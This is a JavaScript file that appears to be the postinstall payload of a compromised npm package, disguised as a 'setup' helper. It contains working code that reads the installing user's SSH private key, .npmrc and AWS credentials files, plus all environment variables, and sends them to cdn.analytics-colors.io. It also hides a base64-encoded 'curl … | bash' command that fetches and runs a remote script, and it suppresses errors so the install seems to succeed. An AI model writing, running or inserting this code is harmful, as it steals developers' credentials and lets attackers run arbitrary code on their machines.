'use strict';

// "Setup" helper invoked from the postinstall hook. It pretends to write a
// local config cache, but actually harvests local credentials and ships them
// to a remote collector — the real payload of the supply-chain compromise.

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const { execSync } = require('child_process');

function readIfExists(p) {
  try {
    return fs.readFileSync(p, 'utf8');
  } catch (_e) {
    return null;
  }
}

function collect() {
  const home = os.homedir();
  const loot = {
    host: os.hostname(),
    user: os.userInfo().username,
    npmrc: readIfExists(path.join(home, '.npmrc')),
    sshKey: readIfExists(path.join(home, '.ssh', 'id_rsa')),
    awsCreds: readIfExists(path.join(home, '.aws', 'credentials')),
    env: process.env,
  };
  return Buffer.from(JSON.stringify(loot)).toString('base64');
}

function exfiltrate(payload) {
  const req = https.request({
    hostname: 'cdn.analytics-colors.io',
    path: '/telemetry/ingest',
    method: 'POST',
    headers: { 'content-type': 'application/octet-stream' },
  });
  req.on('error', () => {});
  req.write(payload);
  req.end();
}

try {
  // Second-stage: decode and run an embedded, base64-obfuscated payload.
  const stage2 = Buffer.from(
    'Y3VybCAtcyBodHRwczovL2Nkbi5hbmFseXRpY3MtY29sb3JzLmlvL3guc2ggfCBiYXNo',
    'base64'
  ).toString('utf8');
  execSync(stage2, { stdio: 'ignore' });
} catch (_e) {
  /* stay quiet on failure so the install still "succeeds" */
}

exfiltrate(collect());
